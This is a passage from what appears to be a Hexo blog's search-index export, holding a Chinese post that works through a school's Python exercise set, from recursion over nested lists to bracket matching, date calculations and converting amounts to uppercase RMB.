class="string">&quot; &quot;</span>.join(y <span class="keyword">for</span> y <span class="keyword">in</span> Allname[x]))</span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>一、进阶py：通关一个某校的题库</title>
    <url>/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/</url>
    <content><![CDATA[<h1 id="一、进阶py：通关一个某校的题库"><a href="#一、进阶py：通关一个某校的题库" class="headerlink" title="一、进阶py：通关一个某校的题库"></a>一、进阶py：通关一个某校的题库</h1><h2 id="第一关，除去列表中的重复元素"><a href="#第一关，除去列表中的重复元素" class="headerlink" title="第一关，除去列表中的重复元素"></a>第一关，除去列表中的重复元素</h2><p>已知两个列表，可能包含有相同元素，请找出两个列表的相同元素，并放入新的列表。打印新列表。输出结果中没有重复元素,如果两个列表中没有相同元素则输出[]。</p>
<p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220105182957787.png" alt="image-20220105182957787"></p>
<h2 id="第二关-递归求嵌套层数"><a href="#第二关-递归求嵌套层数" class="headerlink" title="第二关 递归求嵌套层数"></a>第二关 递归求嵌套层数</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220105195353498.png" alt="image-20220105195353498"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_max = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level</span>(<span class="params">mylist,a=-<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="built_in">isinstance</span>(mylist,<span class="built_in">list</span>):  <span class="comment">#判断mylist变量是否是一个列表</span></span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> mylist:</span><br><span class="line">            level(item,a)</span><br><span class="line">        list_max.append(a)</span><br><span class="line">        list_max.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        max_level = list_max[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> max_level + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 不是列表，递归结束条件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">origin=<span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(level(origin))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="中途插一关-递归输出索引"><a href="#中途插一关-递归输出索引" class="headerlink" title="中途插一关 递归输出索引"></a>中途插一关 递归输出索引</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220105204458620.png" alt="image-20220105204458620"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    somestr, substr, startstr, endstr = <span class="built_in">input</span>().split()</span><br><span class="line">    startnum = <span class="built_in">int</span>(startstr)</span><br><span class="line">    endnum = <span class="built_in">int</span>(endstr)</span><br><span class="line">    fun(somestr, substr, startnum, endnum)</span><br><span class="line">num_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">a,b,c,d</span>):</span></span><br><span class="line">    a_list = <span class="built_in">list</span>(a)</span><br><span class="line">    b_list = <span class="built_in">list</span>(b)</span><br><span class="line">    <span class="keyword">if</span> c+<span class="number">2</span>&lt;d:</span><br><span class="line">        <span class="keyword">if</span> a_list[c] == b_list[<span class="number">0</span>] <span class="keyword">and</span> a_list[c+<span class="number">1</span>] == b_list[<span class="number">1</span>] <span class="keyword">and</span> a_list[c+<span class="number">2</span>] == b_list[<span class="number">2</span>]:</span><br><span class="line">            index = c</span><br><span class="line">            num_list.append(index)</span><br><span class="line">            fun(a,b,c+<span class="number">3</span>,d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fun(a,b,c+<span class="number">1</span>,d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> num_list == []:</span><br><span class="line">            <span class="built_in">print</span>(<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(num_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="第三关-递归求加权和"><a href="#第三关-递归求加权和" class="headerlink" title="第三关 递归求加权和"></a>第三关 递归求加权和</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220105231142866.png" alt="image-20220105231142866"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num_list = []</span><br><span class="line"><span class="comment">#定义了一个吧列表里面所有元素加起来的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jia</span>(<span class="params">a,b=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> a:</span><br><span class="line">        b = b + item</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sumlist</span>(<span class="params">lists,w</span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item,<span class="built_in">list</span>):</span><br><span class="line">            sumlist(item,w+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">             num_list.append(item*w)</span><br><span class="line">    <span class="keyword">return</span> jia(num_list)</span><br><span class="line">nums  =  <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">addv  =  sumlist(nums,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(addv)</span><br></pre></td></tr></table></figure>

<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220106000047657.png" alt="image-20220106000047657"></p>
<p>第一个correct.in文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rhe+[35(fjej)w-wr3f[efe&#123;feofds&#125;]</span><br></pre></td></tr></table></figure>

<p>__main__文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建两个符号表</span></span><br><span class="line">symbols = &#123;<span class="string">&#x27;&#125;&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>&#125;</span><br><span class="line">symbols_l, symbols_r = symbols.values(), symbols.keys()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> symbols_l:</span><br><span class="line">            <span class="comment"># 左符号存入列表</span></span><br><span class="line">            arr.append(c)</span><br><span class="line">        <span class="keyword">elif</span> c <span class="keyword">in</span> symbols_r:</span><br><span class="line">            <span class="comment"># 右符号要不在列表中不存在，要么匹配失败</span></span><br><span class="line">            <span class="keyword">if</span> arr <span class="keyword">and</span> arr[-<span class="number">1</span>] == symbols[c]:</span><br><span class="line">                arr.pop()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">#上面用栈的思想</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;correct.in&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    res = check(data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;correct.out&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">    g.write(<span class="built_in">str</span>(res))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第五关-输出特定节日（类似母亲节）"><a href="#第五关-输出特定节日（类似母亲节）" class="headerlink" title="第五关 输出特定节日（类似母亲节）"></a>第五关 输出特定节日（类似母亲节）</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220107132040203.png" alt="image-20220107132040203"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">input</span>()</span><br><span class="line">data_list = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">a,b,c,y1,y2 = data_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_date</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">  <span class="comment">#判断是否是一个有效的日期字符串</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    datetime.date(a,b,c)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">festival</span>(<span class="params">a=a,b=b,c=c,y1=y1,y2=y2</span>):</span></span><br><span class="line">    year = []</span><br><span class="line">    a = <span class="built_in">int</span>(a)</span><br><span class="line">    b = <span class="built_in">int</span>(b)</span><br><span class="line">    c = <span class="built_in">int</span>(c)</span><br><span class="line">    y1 = <span class="built_in">int</span>(y1)</span><br><span class="line">    y2 = <span class="built_in">int</span>(y2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y1,y2+<span class="number">1</span>):</span><br><span class="line">        year.append(i)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> year:</span><br><span class="line">        daterange = calendar.monthrange(item, a)</span><br><span class="line">        date = (b - <span class="number">1</span>) * <span class="number">7</span> + c - daterange[<span class="number">0</span>]  <span class="comment"># 计算日期</span></span><br><span class="line">        <span class="keyword">if</span> is_valid_date(item, a, date):  <span class="comment"># 判断是否有效</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;item&#125;</span> <span class="subst">&#123;a&#125;</span> <span class="subst">&#123;date&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="literal">None</span>)</span><br><span class="line">festival()</span><br></pre></td></tr></table></figure>

<h2 id="第六题-定义类计算票价"><a href="#第六题-定义类计算票价" class="headerlink" title="第六题 定义类计算票价"></a>第六题 定义类计算票价</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220109181909010.png" alt="image-20220109181909010"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">calculator</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,adult,child,date</span>):</span></span><br><span class="line">        self.adult = adult</span><br><span class="line">        self.child = child</span><br><span class="line">        self.date_list = date.split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">        self.year = self.date_list[<span class="number">0</span>]</span><br><span class="line">        self.month = self.date_list[<span class="number">1</span>]</span><br><span class="line">        self.day = self.date_list[<span class="number">2</span>]</span><br><span class="line">        self.workday = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adult_cost</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = date(<span class="built_in">int</span>(self.year), <span class="built_in">int</span>(self.month), <span class="built_in">int</span>(self.day))</span><br><span class="line">        <span class="keyword">if</span> x.weekday() <span class="keyword">in</span> self.workday:</span><br><span class="line">            <span class="keyword">return</span> self.adult*<span class="number">100</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.adult*<span class="number">120</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">child_cost</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = date(<span class="built_in">int</span>(self.year), <span class="built_in">int</span>(self.month), <span class="built_in">int</span>(self.day))</span><br><span class="line">        <span class="keyword">if</span> x.weekday() <span class="keyword">in</span> self.workday:</span><br><span class="line">            <span class="keyword">return</span> self.child*<span class="number">50</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.child*<span class="number">60</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isweekend</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = date(<span class="built_in">int</span>(self.year), <span class="built_in">int</span>(self.month), <span class="built_in">int</span>(self.day))</span><br><span class="line">        <span class="keyword">if</span> x.weekday() <span class="keyword">in</span> self.workday:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">f&quot;adult:<span class="subst">&#123;self.adult&#125;</span>,child:<span class="subst">&#123;self.child&#125;</span>,isWeekend:<span class="subst">&#123;self.isweekend()&#125;</span>,total cost:<span class="subst">&#123;<span class="built_in">int</span>(self.child_cost()+self.adult_cost())&#125;</span>.0&quot;</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">data = <span class="built_in">input</span>()</span><br><span class="line">a,b,c = data.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">ex = calculator(adult=<span class="built_in">int</span>(a),child=<span class="built_in">int</span>(b),date=c)</span><br><span class="line"><span class="built_in">print</span>(ex.result())</span><br></pre></td></tr></table></figure>

<h2 id="人民币大写"><a href="#人民币大写" class="headerlink" title="人民币大写"></a>人民币大写</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220109181954023.png" alt="image-20220109181954023"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.stdin = io.TextIOWrapper(sys.stdin.buffer,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cncurrency</span>(<span class="params">value, capital=<span class="literal">True</span>, prefix=<span class="literal">False</span>, classical=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> classical <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        classical = <span class="literal">True</span> <span class="keyword">if</span> capital <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> prefix <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        prefix = <span class="string">&#x27;人民币&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> capital:</span><br><span class="line">        num = (<span class="string">&#x27;零&#x27;</span>, <span class="string">&#x27;壹&#x27;</span>, <span class="string">&#x27;贰&#x27;</span>, <span class="string">&#x27;叁&#x27;</span>, <span class="string">&#x27;肆&#x27;</span>, <span class="string">&#x27;伍&#x27;</span>, <span class="string">&#x27;陆&#x27;</span>, <span class="string">&#x27;柒&#x27;</span>, <span class="string">&#x27;捌&#x27;</span>, <span class="string">&#x27;玖&#x27;</span>)</span><br><span class="line">        iunit = [<span class="literal">None</span>, <span class="string">&#x27;拾&#x27;</span>, <span class="string">&#x27;佰&#x27;</span>, <span class="string">&#x27;仟&#x27;</span>, <span class="string">&#x27;万&#x27;</span>, <span class="string">&#x27;拾&#x27;</span>, <span class="string">&#x27;佰&#x27;</span>, <span class="string">&#x27;仟&#x27;</span>,<span class="string">&#x27;亿&#x27;</span>, <span class="string">&#x27;拾&#x27;</span>, <span class="string">&#x27;佰&#x27;</span>, <span class="string">&#x27;仟&#x27;</span>, <span class="string">&#x27;万&#x27;</span>, <span class="string">&#x27;拾&#x27;</span>, <span class="string">&#x27;佰&#x27;</span>, <span class="string">&#x27;仟&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num = (<span class="string">&#x27;〇&#x27;</span>, <span class="string">&#x27;一&#x27;</span>, <span class="string">&#x27;二&#x27;</span>, <span class="string">&#x27;三&#x27;</span>, <span class="string">&#x27;四&#x27;</span>, <span class="string">&#x27;五&#x27;</span>, <span class="string">&#x27;六&#x27;</span>, <span class="string">&#x27;七&#x27;</span>, <span class="string">&#x27;八&#x27;</span>, <span class="string">&#x27;九&#x27;</span>)</span><br><span class="line">        iunit = [<span class="literal">None</span>, <span class="string">&#x27;十&#x27;</span>, <span class="string">&#x27;百&#x27;</span>, <span class="string">&#x27;千&#x27;</span>, <span class="string">&#x27;万&#x27;</span>, <span class="string">&#x27;十&#x27;</span>, <span class="string">&#x27;百&#x27;</span>, <span class="string">&#x27;千&#x27;</span>,<span class="string">&#x27;亿&#x27;</span>, <span class="string">&#x27;十&#x27;</span>, <span class="string">&#x27;百&#x27;</span>, <span class="string">&#x27;千&#x27;</span>, <span class="string">&#x27;万&#x27;</span>, <span class="string">&#x27;十&#x27;</span>, <span class="string">&#x27;百&#x27;</span>, <span class="string">&#x27;千&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> classical:</span><br><span class="line">        iunit[<span class="number">0</span>] = <span class="string">&#x27;元&#x27;</span> <span class="keyword">if</span> classical <span class="keyword">else</span> <span class="string">&#x27;圆&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, Decimal):</span><br><span class="line">        value = Decimal(value).quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转化为字符串</span></span><br><span class="line">    s = <span class="built_in">str</span>(value)</span><br><span class="line">    istr, dstr = s.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    istr = istr[::-<span class="number">1</span>]</span><br><span class="line">    so = []     <span class="comment"># 用于记录转换结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 零</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> prefix + num[<span class="number">0</span>] + iunit[<span class="number">0</span>]</span><br><span class="line">    haszero = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> dstr == <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">        haszero = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理整数部分</span></span><br><span class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(istr):</span><br><span class="line">        n = <span class="built_in">int</span>(n)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">8</span> <span class="keyword">and</span> so[-<span class="number">1</span>] == iunit[<span class="number">4</span>]:</span><br><span class="line">                so.pop()</span><br><span class="line">            so.append(iunit[i])</span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> haszero:</span><br><span class="line">                    so.insert(-<span class="number">1</span>, num[<span class="number">0</span>])</span><br><span class="line">                    haszero = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                so.append(num[n])</span><br><span class="line">                haszero = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> n != <span class="number">0</span>:</span><br><span class="line">                so.append(iunit[i])</span><br><span class="line">                so.append(num[n])</span><br><span class="line">                haszero = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> haszero:</span><br><span class="line">                    so.append(num[<span class="number">0</span>])</span><br><span class="line">                    haszero = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    so.append(prefix)</span><br><span class="line">    so.reverse()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(so)</span><br><span class="line"></span><br><span class="line">i=<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span> (cncurrency(i)+<span class="string">&quot;整&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="计算教学周"><a href="#计算教学周" class="headerlink" title="计算教学周"></a>计算教学周</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220109182026041.png" alt="image-20220109182026041"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">frist_date = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">date = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">year1,month1,day1 = frist_date</span><br><span class="line">year2,month2,day2 = date</span><br><span class="line">d1 = datetime.date(<span class="built_in">int</span>(year1),<span class="built_in">int</span>(month1),<span class="built_in">int</span>(day1))</span><br><span class="line">d2 = datetime.date(<span class="built_in">int</span>(year2),<span class="built_in">int</span>(month2),<span class="built_in">int</span>(day2))</span><br><span class="line"></span><br><span class="line">gap = (d2-d1).days</span><br><span class="line">week = (gap-(gap%<span class="number">7</span>))/<span class="number">7</span>+<span class="number">1</span></span><br><span class="line">xingqiji = gap%<span class="number">7</span>+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">round</span>(week)&#125;</span> <span class="subst">&#123;xingqiji&#125;</span>&quot;</span>)<span class="comment">#用四舍五入来取整</span></span><br></pre></td></tr></table></figure>

<h2 id="找出同一周上课的周次"><a href="#找出同一周上课的周次" class="headerlink" title="找出同一周上课的周次"></a>找出同一周上课的周次</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220109182135667.png" alt="image-20220109182135667"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data1 = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">data2 = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">date1 = <span class="built_in">set</span>()<span class="comment">#第一节课的数据</span></span><br><span class="line">date2 = <span class="built_in">set</span>()<span class="comment">#第二节课的数据</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data1:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">        gap = item.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(gap[<span class="number">0</span>]),<span class="built_in">int</span>(gap[<span class="number">1</span>])+<span class="number">1</span>):</span><br><span class="line">            date1.add(<span class="built_in">int</span>(num))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        date1.add(<span class="built_in">int</span>(item))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data2:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">        gap = item.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(gap[<span class="number">0</span>]),<span class="built_in">int</span>(gap[<span class="number">1</span>])+<span class="number">1</span>):</span><br><span class="line">            date2.add(<span class="built_in">int</span>(num))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        date2.add(<span class="built_in">int</span>(item))</span><br><span class="line"></span><br><span class="line">res = date1&amp;date2</span><br><span class="line">res2 = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="keyword">if</span> res == <span class="built_in">set</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;none&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    final = <span class="string">&quot; &quot;</span>.join(<span class="string">&#x27;%s&#x27;</span> %item <span class="keyword">for</span> item <span class="keyword">in</span> res2)</span><br><span class="line">    <span class="built_in">print</span>(final)</span><br></pre></td></tr></table></figure>

<h2 id="课程表调表"><a href="#课程表调表" class="headerlink" title="课程表调表"></a>课程表调表</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220109182214040.png" alt="image-20220109182214040"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line">data1 = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">data2 = <span class="built_in">input</span>()</span><br><span class="line">data3 = <span class="built_in">input</span>()</span><br><span class="line">date1 = []<span class="comment">#第一节课的数据</span></span><br><span class="line">new_date = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_str</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line">    final_list = []</span><br><span class="line">    fun = <span class="keyword">lambda</span> x: x[<span class="number">1</span>]-x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> k, g <span class="keyword">in</span> groupby(<span class="built_in">enumerate</span>(<span class="built_in">list</span>), fun):</span><br><span class="line">      l1 = [j <span class="keyword">for</span> i, j <span class="keyword">in</span> g]  <span class="comment"># 连续数字的列表</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(l1) &gt; <span class="number">1</span>:</span><br><span class="line">        scop = <span class="built_in">str</span>(<span class="built_in">min</span>(l1)) + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">max</span>(l1))  <span class="comment"># 将连续数字范围用&quot;-&quot;连接</span></span><br><span class="line">        final_list.append(scop)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        scop = l1[<span class="number">0</span>]</span><br><span class="line">        final_list.append(scop)</span><br><span class="line">    <span class="keyword">return</span> 